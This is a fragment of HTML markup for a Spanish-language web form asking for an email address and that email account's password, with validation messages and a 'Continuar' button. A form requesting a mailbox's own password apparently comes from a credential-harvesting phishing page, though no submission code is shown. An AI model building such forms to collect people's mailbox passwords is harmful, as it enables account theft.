                        ...
                        <div class="izq">
                            <form autocomplete="off" id="femail">
                                ...
                                <div class="inputg columna">
                                    <input type="text" name="correo" id="correo" placeholder="Dirección de correo"
                                        maxlength="200" />
                                        <div class="error" id="ecorreo">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Ingresa un correo electrónico valido</span>
                                    </div>
                                </div>
                                <div class="inputg columna">
                                    ...
                                    <input type="password" name="econtra" id="econtra" placeholder="Contraseña del correo"
                                        maxlength="25" class="contrasena" style=" width: 99%;" />
                                        <div class="error" id="error_contra">
                                        <img src="img/war.svg" alt="error"> 
                                        <span class="rojo">Contraseña de correo incorrecta</span>
                                    </div>
                                </div>
                               
                                            
                                <div class="inputgb">
                                    <button type="button" id="btnemail" class="btn">Continuar</button>
                                </div>
